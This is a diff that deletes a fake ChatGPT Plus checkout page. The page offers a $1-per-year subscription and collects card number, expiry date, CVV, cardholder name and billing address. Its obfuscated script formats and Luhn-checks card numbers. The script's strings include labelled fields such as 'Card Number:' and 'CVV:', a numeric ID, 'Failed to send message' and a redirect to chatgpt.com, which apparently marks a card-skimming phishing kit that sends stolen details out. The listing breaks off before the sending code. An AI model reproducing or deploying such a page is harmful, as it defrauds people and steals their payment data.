@@ -1,216 +1,516 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open AI GPT-4 Plus Upgrade</title>
-</head>
-<body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', 'Ubuntu', sans-serif; background-color: #f7f7f7; margin: 0;">
-
-    <!-- Container -->
-    <div style="width: 90%; max-width: 900px; display: flex; flex-direction: row; flex-wrap: wrap; box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1); background-color: white; padding: 30px; border-radius: 10px; margin: 20px auto;">
-
-        <!-- Left Side: Subscription Summary -->
-        <div style="flex: 1; padding-right: 20px; padding-bottom: 50px; padding-top: 50px; box-sizing: border-box; min-width: 250px;">
-            <!-- Logo -->
-            <div style="height: 40px; margin-bottom: 20px;">
-                <img src="https://companieslogo.com/img/orig/openai_BIG-713d570c.png?t=1720244494" alt="Logo" style="display: block; margin: 0 auto; width: 120px; height: auto;">
-            </div>
-            
-            <!-- Subscription Info -->
-            <h5 style="font-size: 14px; margin: 0 0 10px; font-weight: 600;">Subscribe to ChatGPT 4 Plus Subscription</h5>
-            <p style="font-size: 36px; font-weight: 600; margin: 0;">$1.00 <span style="font-size: 16px; font-weight: 400;">per year</span></p>
-        
-            <!-- Summary List -->
-            <div style="margin-top: 30px; font-size: 16px;">
-                <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
-                    <span>ChatGPT 4 Plus Subscription</span>
-                    <span>$1.00</span>
-                </div>
-                <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
-                    <span>Subtotal</span>
-                    <span>$1.00</span>
-                </div>
-                <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
-                    <span>Tax</span>
-                    <span>Enter address to calculate</span>
-                </div>
-                <div style="display: flex; justify-content: space-between; margin-bottom: 10px; font-weight: 700; margin-top: 20px;">
-                    <span>Total due today</span>
-                    <span>$1.00</span>
-                </div>
-            </div>
-        </div>
-
-        <!-- Divider -->
-        <div style="width: 1px; background-color: #e0e0e0; margin: 0 20px;"></div>
-
-        <!-- Right Side: Payment Form -->
-        <div style="flex: 1; padding-top: 50px; box-sizing: border-box; min-width: 250px;">
-
-            <h5 style="font-size: 18px; margin: 0 0 10px; font-weight: 600;">Payment Information</h5>
-
-            <!-- Contact Info -->
-    <div style="margin-bottom: 20px;">
-        <label for="email" style="display: block; font-size: 14px; color: #666; margin-bottom: 8px;">Contact information</label>
-        <input type="email" id="email" placeholder="Email" value="jewij66313@obisims.com" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
-        <div id="email-error" style="color: red; font-size: 12px; margin-top: -10px; margin-bottom: 10px;"></div>
-    </div>
-
-    <!-- Payment Method -->
-    <div style="margin-bottom: 20px;">
-        <label style="display: block; font-size: 14px; color: #666; margin-bottom: 8px;">Payment method</label>
-
-        <!-- Card Information -->
-        <fieldset style="border: none; padding: 0; margin: 0;">
-            <!-- Card Number Input with Icons Inside -->
-            <div style="position: relative; margin-bottom: 20px;">
-                <input type="text" id="card-number" name="cardNumber" inputmode="numeric" autocomplete="cc-number" autocorrect="off" spellcheck="false" placeholder="1234 1234 1234 1234" aria-invalid="false" value=""
-                    maxlength="19" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box; padding-right: 140px;">
-                
-                <!-- Card Icons inside input -->
-                <div style="position: absolute; top: 12px; right: 12px; display: flex; gap: 8px;">
-                    <img src="https://js.stripe.com/v3/fingerprinted/img/visa-729c05c240c4bdb47b03ac81d9945bfe.svg" alt="Visa" style="height: 20px;">
-                    <img src="https://js.stripe.com/v3/fingerprinted/img/mastercard-4d8844094130711885b5e41b28c9848f.svg" alt="MasterCard" style="height: 20px;">
-                    <img src="https://js.stripe.com/v3/fingerprinted/img/amex-a49b82f46c5cd6a96a6e418a6ca1717c.svg" alt="American Express" style="height: 20px;">
-                    <img src="https://js.stripe.com/v3/fingerprinted/img/discover-ac52cd46f89fa40a29a0bfb954e33173.svg" alt="Discover" style="height: 20px;">
-                </div>
-            </div>
-            
-
-            <!-- Expiry Date and CVC Input -->
-            <div style="display: flex; gap: 10px;">
-                <div style="flex: 1;">
-                    <input type="text" id="expiry-date" name="cardExpiry" inputmode="numeric" autocomplete="cc-exp" autocorrect="off" spellcheck="false" placeholder="MM / YY" aria-invalid="false" value=""
-                        style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
-                </div>
-                <div style="flex: 1;">
-                    <input type="text" id="cvv" name="cardCvc" inputmode="numeric" autocomplete="cc-csc" autocorrect="off" spellcheck="false" placeholder="CVC" aria-invalid="false" value=""
-                    maxlength="4" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
-                </div>
-            </div>
-        </fieldset>
-
-        <div id="card-number-error" style="color: red; font-size: 12px; margin-top: -10px; margin-bottom: 10px;"></div>
-    </div>
-
-    <!-- Cardholder Name -->
-    <div style="margin-bottom: 20px;">
-        <label for="cardholder-name" style="display: block; font-size: 14px; color: #666; margin-bottom: 8px;">Cardholder name</label>
-        <input type="text" id="cardholder-name" placeholder="Full name on card" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
-        <div id="cardholder-name-error" style="color: red; font-size: 12px; margin-top: -10px; margin-bottom: 10px;"></div>
-    </div>
-
-    <!-- Billing Address -->
-    <div style="margin-bottom: 20px;">
-        <label for="country" style="display: block; font-size: 14px; color: #666; margin-bottom: 8px;">Country</label>
-        <select id="country" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
-            <!-- United States -->
-            <option value="US">United States</option>
-            <!-- Canada -->
-            <option value="CA">Canada</option>
-            <!-- Nigeria -->
-            <option value="NG">Nigeria</option>
-            <!-- Kenya -->
-            <option value="KE">Kenya</option>
-            <!-- United Kingdom -->
-            <option value="GB">United Kingdom</option>
-            <!-- Australia -->
-            <option value="AU">Australia</option>
-            <!-- Germany -->
-            <option value="DE">Deutschland</option>
-            <!-- France -->
-            <option value="FR">France</option>
-            <!-- Italy -->
-            <option value="IT">Italia</option>
-            <!-- Spain -->
-            <option value="ES">España</option>
-            <!-- Brazil -->
-            <option value="BR">Brasil</option>
-            <!-- India -->
-            <option value="IN">भारत</option>
-            <!-- China -->
-            <option value="CN">中国</option>
-            <!-- Japan -->
-            <option value="JP">日本</option>
-            <!-- South Korea -->
-            <option value="KR">대한민국</option>
-            <!-- Mexico -->
-            <option value="MX">México</option>
-            <!-- South Africa -->
-            <option value="ZA">South Africa</option>
-            <!-- Netherlands -->
-            <option value="NL">Nederland</option>
-            <!-- Sweden -->
-            <option value="SE">Sverige</option>
-            <!-- Norway -->
-            <option value="NO">Norge</option>
-        </select>
-        
-
-        <label for="state" style="display: block; font-size: 14px; color: #666; margin-bottom: 8px; margin-top: 12px;">State/Province</label>
-        <select id="state" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
-            <!-- States/Provinces will be populated here based on selected country -->
-        </select>
-
-        <div style="margin-top: 12px;">
-            <input type="text" id="address1" placeholder="Address line 1" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box; margin-bottom: 10px;">
-            <input type="text" id="address2" placeholder="Address line 2" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box; margin-bottom: 10px;">
-            <div style="display: flex; gap: 10px;">
-                <input type="text" id="city" placeholder="City" style="flex: 1; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box; margin-right: 10px;">
-                <input type="text" id="zip" placeholder="ZIP" style="flex: 1; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box;">
-            </div>
-            <div id="address-error" style="color: red; font-size: 12px; margin-top: -10px; margin-bottom: 10px;"></div>
-        </div>
-    </div>
-
-    <!-- Save Info for 1-Click Checkout -->
-    <div style="margin-bottom: 20px;">
-        <input type="checkbox" id="save-info" style="margin-right: 8px;">
-        <label for="save-info" style="font-size: 14px;">Securely save my information for 1-click checkout</label>
-    </div>
-
-    <!-- Subscribe Button -->
-    <button id="subscribe-button" style="width: 100%; background-color: #2ab27b; color: white; padding: 12px; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1);">Subscribe</button>
-        </div>
-
-    </div>
-
-    <style>
-        /* Media query to stack on smaller screens */
-        @media (max-width: 768px) {
-            div[style*="display: flex"] {
-                flex-direction: column; /* Stack columns vertically */
-            }
-
-            div[style*="padding-left: 20px"] {
-                padding-left: 0; /* Adjust padding for mobile */
-            }
-
-            div[style*="padding-right: 20px"] {
-                padding-right: 0; /* Adjust padding for mobile */
-            }
-
-            div[style*="border-right"] {
-                border-right: none; /* Remove divider on mobile */
-            }
-
-            div[style*="margin: 0 20px"] {
-                margin: 0; /* Remove margin around the divider */
-            }
-        }
-    </style>
-</body>
-</html>
-
-
-
-    <script>
-      const _0x65d48a=_0x2e19;function _0x3a0f(){const _0x196818=['Imo','zip','Orebro','Gauteng','South\x20Dakota','Mississippi','address2','New\x20Brunswick','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Country:\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20======================================\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Email:\x20','Marche','Quintana\x20Roo','Louisiana','email-error','Schleswig-Holstein','addEventListener','Massachusetts','match','Gelderland','Please\x20enter\x20a\x20valid\x20email\x20address.','length','Noord-Holland','5068645042','Valle\x20d\x27Aosta','Eastern','Veracruz','Telangana','16426458XqQYYn','Delta','Sachsen-Anhalt','Please\x20enter\x20a\x20valid\x20CVV.','Washington','Wales','New\x20South\x20Wales','Tocantins','catch','join','Ohio','New\x20York','Ebonyi','Oaxaca','São\x20Paulo','제주도','Zacatecas','경기도','Cantabria','DOMContentLoaded','704967uSRgEc','Missouri','Occitanie','Canarias','Hordaland','Campeche','Michigan','Akwa\x20Ibom','Overijssel','Castilla-La\x20Mancha','error','Victoria','Campania','Castilla\x20y\x20León','Mato\x20Grosso','Western\x20Cape','Western\x20Australia','Limburg','Sikkim','Paraíba','Buskerud','.error-message','8GUstpP','Nagaland','Prince\x20Edward\x20Island','Wyoming','Pernambuco','Please\x20enter\x20the\x20cardholder\x20name.','739974sIaXOd','3672792JtvTzO','Ogun','Bourgogne-Franche-Comté','North\x20West','충청북도','Nayarit','cardholder-name','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20=======================================\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','Nebraska','Ciudad\x20de\x20México','https://chatgpt.com','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20CVV:\x20','Molise','Amazonas','Blekinge','전라북도','Bayern','Sergipe','Goiás','Aust-Agder','Santa\x20Catarina','<option\x20value=\x22','Minnesota','Gotland','Jämtland','card-number','Borno','Kogi','Baden-Württemberg','Dalarna','Alberta','Maryland','expiry-date-error','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Expiry\x20Date:\x20','Navarra','Akershus','Mecklenburg-Vorpommern','Bretagne','Pays\x20de\x20la\x20Loire','1014252VIXxwQ','Manipur','Chhattisgarh','North\x20Eastern','North\x20Carolina','Jharkhand','Normandie','subscribe-button','Zuid-Holland','Bayelsa','Baja\x20California\x20Sur','Toscana','Västernorrland','Nordland','Aguascalientes','Oklahoma','Tennessee','Quebec','Östergötland','getFullYear','Rift\x20Valley','city','Andalucía','Plateau','San\x20Luis\x20Potosí','Piemonte','innerHTML','Groningen','Corse','Odisha','Utrecht','Sinaloa','Møre\x20og\x20Romsdal','Maharashtra','getElementById','Osun','Amapá','Kentucky','Georgia','state','target','Rhode\x20Island','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Cardholder\x20Name:\x20','An\x20error\x20occurred.\x20Please\x20try\x20again.','Chiapas','Liguria','Vestfold','Cross\x20River','Free\x20State','Oyo','Pennsylvania','address1','Ekiti','Uppsala','email','Utah','Puebla','Maine','北海道','전라남도','Hedmark','Northern\x20Ireland','Gujarat','Northern\x20Cape','country','Limpopo','Hauts-de-France','Indiana','Oslo','黑龙江','Gävleborg','Västerbotten','Kerala','Colima','Guerrero','28ohNbrQ','Lagos','Halland','Please\x20enter\x20your\x20address\x20and\x20city.','test','split','Stockholm','Södermanland','Tripura','Bihar','Virginia','Tamaulipas','Sokoto','Aragón','Brandenburg','Manitoba','Meghalaya','Mpumalanga','Rivers','Maranhão','Grand\x20Est','Bahia','Australian\x20Capital\x20Territory','Paraná','2469215AOIzCU','Madrid','Durango','Rogaland','Nevada','Minas\x20Gerais','West\x20Bengal','value','England','getMonth','Lombardia','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ZIP:\x20','Värmland','then','New\x20Hampshire','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20City:\x20','Guanajuato','Himachal\x20Pradesh','Please\x20enter\x20a\x20valid\x20ZIP\x20code.','Extremadura','Vest-Agder','Texas','Eastern\x20Cape','address-error','Please\x20enter\x20a\x20valid\x20expiry\x20date.','</option>','input','Idaho','Queensland','Roraima','Rio\x20Grande\x20do\x20Norte','Estado\x20de\x20México','Tamil\x20Nadu','Arizona','Failed\x20to\x20send\x20message.\x20Please\x20try\x20again.','1091921XZgFfd','card-number-error','Centre-Val\x20de\x20Loire','forEach','click','Abruzzo','和歌山','Niedersachsen','神奈川','Yucatán','expiry-date','slice','Connecticut','Western','Gombe','Tasmania','Lazio','경상남도','Abia','British\x20Columbia','cvv','Norrbotten','Nasarawa','Berlin','Cataluña','Ontario','Västra\x20Götaland','Ceará','California','Zamfara','Nuevo\x20León','Scotland','Jigawa','Auvergne-Rhône-Alpes','Illinois','Coahuila','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Card\x20Number:\x20','Umbria','textContent','Assam','Montana','Mizoram','Rio\x20de\x20Janeiro','Jönköping','West\x20Virginia','Michoacán','map','Veneto','Querétaro','Kwara','Hawaii','Punjab','Taraba','Kansas','Kaduna','Sicilia','Andhra\x20Pradesh','Provence-Alpes-Côte\x20d\x27Azur','Oppland','Flevoland','replace','Delaware','Sardegna','충청남도','Islas\x20Baleares','Katsina','Ondo','href','Île-de-France','Pará','Calabria','Uttar\x20Pradesh','Acre','Tlaxcala','Sonora','location','Kano','Wisconsin','Kronoberg','경상북도','Error:','Troms','Enugu','Vermont','Baja\x20California','New\x20Jersey','Benue','Puglia','Emilia-Romagna'];_0x3a0f=function(){return _0x196818;};return _0x3a0f();}function _0x2e19(_0x3cd798,_0x92a990){const _0x3a0f3d=_0x3a0f();return _0x2e19=function(_0x2e1907,_0x4794cf){_0x2e1907=_0x2e1907-0x186;let _0x2e0155=_0x3a0f3d[_0x2e1907];return _0x2e0155;},_0x2e19(_0x3cd798,_0x92a990);}(function(_0x4c6ec4,_0x237c71){const _0x1a24e7=_0x2e19,_0x23e218=_0x4c6ec4();while(!![]){try{const _0x6b7d27=parseInt(_0x1a24e7(0x234))/0x1+parseInt(_0x1a24e7(0x186))/0x2+-parseInt(_0x1a24e7(0x2bc))/0x3+parseInt(_0x1a24e7(0x2d2))/0x4*(parseInt(_0x1a24e7(0x211))/0x5)+parseInt(_0x1a24e7(0x1ae))/0x6*(parseInt(_0x1a24e7(0x1f9))/0x7)+-parseInt(_0x1a24e7(0x187))/0x8+-parseInt(_0x1a24e7(0x2a8))/0x9;if(_0x6b7d27===_0x237c71)break;else _0x23e218['push'](_0x23e218['shift']());}catch(_0x17162e){_0x23e218['push'](_0x23e218['shift']());}}}(_0x3a0f,0x94130),document[_0x65d48a(0x29c)](_0x65d48a(0x2bb),function(){const _0x5e2eec=_0x65d48a;document[_0x5e2eec(0x1d0)](_0x5e2eec(0x1a0))[_0x5e2eec(0x29c)](_0x5e2eec(0x22b),function(_0x555362){const _0xf7af05=_0x5e2eec;let _0x44470a=_0x555362[_0xf7af05(0x1d6)]['value'][_0xf7af05(0x270)](/\s+/g,'');_0x44470a[_0xf7af05(0x2a1)]>0x0&&(_0x44470a=_0x44470a[_0xf7af05(0x29e)](/.{1,4}/g)[_0xf7af05(0x2b1)]('\x20')),_0x555362[_0xf7af05(0x1d6)][_0xf7af05(0x218)]=_0x44470a;}),document[_0x5e2eec(0x1d0)](_0x5e2eec(0x23e))['addEventListener'](_0x5e2eec(0x22b),function(_0x58bf5f){const _0x59b5d1=_0x5e2eec;let _0x2a1034=_0x58bf5f['target'][_0x59b5d1(0x218)][_0x59b5d1(0x270)](/\D/g,'');_0x2a1034[_0x59b5d1(0x2a1)]>0x2&&(_0x2a1034=_0x2a1034[_0x59b5d1(0x23f)](0x0,0x2)+'/'+_0x2a1034[_0x59b5d1(0x23f)](0x2,0x4)),_0x58bf5f['target']['value']=_0x2a1034;});const _0x37f57d={'US':['Alabama','Alaska',_0x5e2eec(0x232),'Arkansas',_0x5e2eec(0x250),'Colorado',_0x5e2eec(0x240),_0x5e2eec(0x271),'Florida',_0x5e2eec(0x1d4),_0x5e2eec(0x266),_0x5e2eec(0x22c),_0x5e2eec(0x256),_0x5e2eec(0x1f1),'Iowa',_0x5e2eec(0x269),_0x5e2eec(0x1d3),_0x5e2eec(0x299),_0x5e2eec(0x1e7),_0x5e2eec(0x1a6),_0x5e2eec(0x29d),_0x5e2eec(0x2c2),_0x5e2eec(0x19d),_0x5e2eec(0x292),_0x5e2eec(0x2bd),_0x5e2eec(0x25c),_0x5e2eec(0x18f),_0x5e2eec(0x215),_0x5e2eec(0x21f),_0x5e2eec(0x289),'New\x20Mexico',_0x5e2eec(0x2b3),_0x5e2eec(0x1b2),'North\x20Dakota',_0x5e2eec(0x2b2),_0x5e2eec(0x1bd),'Oregon',_0x5e2eec(0x1e0),_0x5e2eec(0x1d7),'South\x20Carolina',_0x5e2eec(0x291),_0x5e2eec(0x1be),_0x5e2eec(0x226),_0x5e2eec(0x1e5),_0x5e2eec(0x287),_0x5e2eec(0x203),_0x5e2eec(0x2ac),_0x5e2eec(0x260),_0x5e2eec(0x281),_0x5e2eec(0x2d5)],'CA':[_0x5e2eec(0x1a5),_0x5e2eec(0x247),_0x5e2eec(0x208),_0x5e2eec(0x294),'Newfoundland\x20and\x20Labrador','Nova\x20Scotia',_0x5e2eec(0x24d),_0x5e2eec(0x2d4),_0x5e2eec(0x1bf),'Saskatchewan'],'NG':[_0x5e2eec(0x246),'Adamawa',_0x5e2eec(0x2c3),'Anambra','Bauchi',_0x5e2eec(0x1b7),_0x5e2eec(0x28a),_0x5e2eec(0x1a1),_0x5e2eec(0x1dd),_0x5e2eec(0x2a9),_0x5e2eec(0x2b4),'Edo',_0x5e2eec(0x1e2),_0x5e2eec(0x286),_0x5e2eec(0x242),_0x5e2eec(0x28d),_0x5e2eec(0x254),_0x5e2eec(0x26a),_0x5e2eec(0x280),_0x5e2eec(0x275),'Kebbi',_0x5e2eec(0x1a2),_0x5e2eec(0x265),_0x5e2eec(0x1fa),_0x5e2eec(0x24a),'Niger',_0x5e2eec(0x188),_0x5e2eec(0x276),_0x5e2eec(0x1d1),_0x5e2eec(0x1df),_0x5e2eec(0x1c5),_0x5e2eec(0x20b),_0x5e2eec(0x205),_0x5e2eec(0x268),'Yobe',_0x5e2eec(0x251)],'KE':['Central','Coast',_0x5e2eec(0x2a5),'Nairobi',_0x5e2eec(0x1b1),'Nyanza',_0x5e2eec(0x1c2),_0x5e2eec(0x241)],'GB':[_0x5e2eec(0x219),_0x5e2eec(0x253),_0x5e2eec(0x2ad),_0x5e2eec(0x1eb)],'AU':[_0x5e2eec(0x2ae),_0x5e2eec(0x2c7),_0x5e2eec(0x22d),'South\x20Australia',_0x5e2eec(0x2cc),_0x5e2eec(0x243),_0x5e2eec(0x20f),'Northern\x20Territory'],'DE':[_0x5e2eec(0x1a3),_0x5e2eec(0x197),_0x5e2eec(0x24b),_0x5e2eec(0x207),'Bremen','Hamburg','Hessen',_0x5e2eec(0x1ab),_0x5e2eec(0x23b),'Nordrhein-Westfalen','Rheinland-Pfalz','Saarland','Sachsen',_0x5e2eec(0x2aa),_0x5e2eec(0x29b),'Thüringen'],'FR':[_0x5e2eec(0x255),_0x5e2eec(0x189),_0x5e2eec(0x1ac),_0x5e2eec(0x236),_0x5e2eec(0x1ca),_0x5e2eec(0x20d),_0x5e2eec(0x1f0),_0x5e2eec(0x278),_0x5e2eec(0x1b4),'Nouvelle-Aquitaine',_0x5e2eec(0x2be),_0x5e2eec(0x1ad),_0x5e2eec(0x26d)],'IT':[_0x5e2eec(0x239),'Basilicata',_0x5e2eec(0x27a),_0x5e2eec(0x2c8),_0x5e2eec(0x28c),'Friuli\x20Venezia\x20Giulia',_0x5e2eec(0x244),_0x5e2eec(0x1db),_0x5e2eec(0x21b),_0x5e2eec(0x297),_0x5e2eec(0x193),_0x5e2eec(0x1c7),_0x5e2eec(0x28b),_0x5e2eec(0x272),_0x5e2eec(0x26b),_0x5e2eec(0x1b9),_0x5e2eec(0x259),_0x5e2eec(0x2a4),_0x5e2eec(0x263)],'ES':[_0x5e2eec(0x1c4),_0x5e2eec(0x206),'Asturias',_0x5e2eec(0x274),'País\x20Vasco',_0x5e2eec(0x2bf),_0x5e2eec(0x2ba),_0x5e2eec(0x2c5),_0x5e2eec(0x2c9),_0x5e2eec(0x24c),_0x5e2eec(0x224),'Galicia',_0x5e2eec(0x212),'Murcia',_0x5e2eec(0x1a9),'La\x20Rioja'],'BR':[_0x5e2eec(0x27c),'Alagoas',_0x5e2eec(0x1d2),_0x5e2eec(0x194),_0x5e2eec(0x20e),_0x5e2eec(0x24f),'Espírito\x20Santo',_0x5e2eec(0x199),_0x5e2eec(0x20c),_0x5e2eec(0x2ca),'Mato\x20Grosso\x20do\x20Sul',_0x5e2eec(0x216),_0x5e2eec(0x279),_0x5e2eec(0x2cf),_0x5e2eec(0x210),_0x5e2eec(0x2d6),'Piauí',_0x5e2eec(0x25e),_0x5e2eec(0x22f),'Rio\x20Grande\x20do\x20Sul','Rondônia',_0x5e2eec(0x22e),_0x5e2eec(0x19b),_0x5e2eec(0x2b6),_0x5e2eec(0x198),_0x5e2eec(0x2af)],'IN':[_0x5e2eec(0x26c),'Arunachal\x20Pradesh',_0x5e2eec(0x25b),_0x5e2eec(0x202),_0x5e2eec(0x1b0),'Goa',_0x5e2eec(0x1ec),'Haryana',_0x5e2eec(0x222),_0x5e2eec(0x1b3),'Karnataka',_0x5e2eec(0x1f6),'Madhya\x20Pradesh',_0x5e2eec(0x1cf),_0x5e2eec(0x1af),_0x5e2eec(0x209),_0x5e2eec(0x25d),_0x5e2eec(0x2d3),_0x5e2eec(0x1cb),_0x5e2eec(0x267),'Rajasthan',_0x5e2eec(0x2ce),_0x5e2eec(0x231),_0x5e2eec(0x2a7),_0x5e2eec(0x201),_0x5e2eec(0x27b),'Uttarakhand',_0x5e2eec(0x217)],'CN':['安徽','北京','重庆','福建','甘肃','广东','贵州','海南','河北',_0x5e2eec(0x1f3),'河南','香港','湖北','湖南','江苏','江西','吉林','辽宁','澳门','宁夏','青海','陕西','山东','上海','山西','四川','台湾','天津','西藏','新疆','云南','浙江'],'JP':['愛知','秋田','青森','千葉','愛媛','福井','福岡','福島','岐阜','群馬','広島',_0x5e2eec(0x1e8),'兵庫','茨城','石川','岩手','香川','鹿児島',_0x5e2eec(0x23c),'高知','熊本','京都','三重','宮城','宮崎','長野','長崎','奈良','新潟','大分','岡山','大阪','佐賀','埼玉','滋賀','島根','静岡','栃木','徳島','東京','鳥取','富山',_0x5e2eec(0x23a),'山形','山口','山梨'],'KR':[_0x5e2eec(0x18b),_0x5e2eec(0x273),_0x5e2eec(0x2b9),_0x5e2eec(0x283),_0x5e2eec(0x245),_0x5e2eec(0x2b7),_0x5e2eec(0x196),_0x5e2eec(0x1e9),'서울','인천','부산','대구','대전','울산','광주','수원','제천','천안','창원'],'MX':[_0x5e2eec(0x1bc),_0x5e2eec(0x288),_0x5e2eec(0x1b8),_0x5e2eec(0x2c1),_0x5e2eec(0x1da),'Chihuahua',_0x5e2eec(0x257),_0x5e2eec(0x1f7),_0x5e2eec(0x213),_0x5e2eec(0x221),_0x5e2eec(0x1f8),'Hidalgo','Jalisco',_0x5e2eec(0x190),_0x5e2eec(0x230),_0x5e2eec(0x261),'Morelos',_0x5e2eec(0x18c),_0x5e2eec(0x252),_0x5e2eec(0x2b5),_0x5e2eec(0x1e6),_0x5e2eec(0x264),_0x5e2eec(0x298),_0x5e2eec(0x1c6),_0x5e2eec(0x1cd),_0x5e2eec(0x27e),'Tabasco',_0x5e2eec(0x204),_0x5e2eec(0x27d),_0x5e2eec(0x2a6),_0x5e2eec(0x23d),_0x5e2eec(0x2b8)],'ZA':[_0x5e2eec(0x227),_0x5e2eec(0x1de),_0x5e2eec(0x290),'KwaZulu-Natal',_0x5e2eec(0x1ef),_0x5e2eec(0x20a),_0x5e2eec(0x1ed),_0x5e2eec(0x18a),_0x5e2eec(0x2cb)],'NL':['Drenthe',_0x5e2eec(0x26f),'Friesland',_0x5e2eec(0x29f),_0x5e2eec(0x1c9),_0x5e2eec(0x2cd),'Noord-Brabant',_0x5e2eec(0x2a2),_0x5e2eec(0x2c4),_0x5e2eec(0x1cc),'Zeeland',_0x5e2eec(0x1b6)],'SE':[_0x5e2eec(0x195),_0x5e2eec(0x1a4),_0x5e2eec(0x1f4),_0x5e2eec(0x19e),_0x5e2eec(0x1fb),_0x5e2eec(0x19f),_0x5e2eec(0x25f),'Kalmar',_0x5e2eec(0x282),_0x5e2eec(0x249),_0x5e2eec(0x28f),_0x5e2eec(0x1c0),'Skåne',_0x5e2eec(0x1ff),_0x5e2eec(0x200),_0x5e2eec(0x1e3),_0x5e2eec(0x21d),_0x5e2eec(0x1f5),_0x5e2eec(0x1ba),_0x5e2eec(0x24e)],'NO':[_0x5e2eec(0x1aa),_0x5e2eec(0x19a),_0x5e2eec(0x2d0),'Finnmark','Hedmark',_0x5e2eec(0x1ea),_0x5e2eec(0x2c0),_0x5e2eec(0x1ce),_0x5e2eec(0x1bb),_0x5e2eec(0x26e),_0x5e2eec(0x1f2),_0x5e2eec(0x214),'Sogn\x20og\x20Fjordane','Sør-Trøndelag','Telemark',_0x5e2eec(0x285),_0x5e2eec(0x225),_0x5e2eec(0x1dc),'Østfold']},_0x541f76=document[_0x5e2eec(0x1d0)](_0x5e2eec(0x1ee)),_0x4465ff=document[_0x5e2eec(0x1d0)](_0x5e2eec(0x1d5));_0x541f76[_0x5e2eec(0x29c)]('change',function(){const _0x5e9926=_0x5e2eec,_0x4b3e82=this['value'],_0x177c96=_0x37f57d[_0x4b3e82]||[];_0x4465ff[_0x5e9926(0x1c8)]=_0x177c96[_0x5e9926(0x262)](_0x225fbf=>_0x5e9926(0x19c)+_0x225fbf+'\x22>'+_0x225fbf+_0x5e9926(0x22a))[_0x5e9926(0x2b1)]('');}),_0x541f76['dispatchEvent'](new Event('change'));function _0x3213b2(_0x21ef4f){const _0x4611ad=_0x5e2eec;let _0x1a0ea0=0x0,_0xd65df6=![];for(let _0x1d624a=_0x21ef4f[_0x4611ad(0x2a1)]-0x1;_0x1d624a>=0x0;_0x1d624a--){let _0x1106bf=parseInt(_0x21ef4f[_0x1d624a]);if(_0xd65df6){_0x1106bf*=0x2;if(_0x1106bf>0x9)_0x1106bf-=0x9;}_0x1a0ea0+=_0x1106bf,_0xd65df6=!_0xd65df6;}return _0x1a0ea0%0xa===0x0;}function _0x2e2c9c(_0x3ae57,_0x4a66b2){const _0x410bd5=_0x5e2eec;_0x3ae57[_0x410bd5(0x25a)]=_0x4a66b2,setTimeout(()=>{const _0x45e83c=_0x410bd5;_0x3ae57[_0x45e83c(0x25a)]='';},0xbb8);}document['getElementById'](_0x5e2eec(0x1b5))[_0x5e2eec(0x29c)](_0x5e2eec(0x238),function(_0x37c0f4){const _0x4f89ea=_0x5e2eec;_0x37c0f4['preventDefault'](),document['querySelectorAll'](_0x4f89ea(0x2d1))[_0x4f89ea(0x237)](_0x1118e3=>_0x1118e3['textContent']='');const 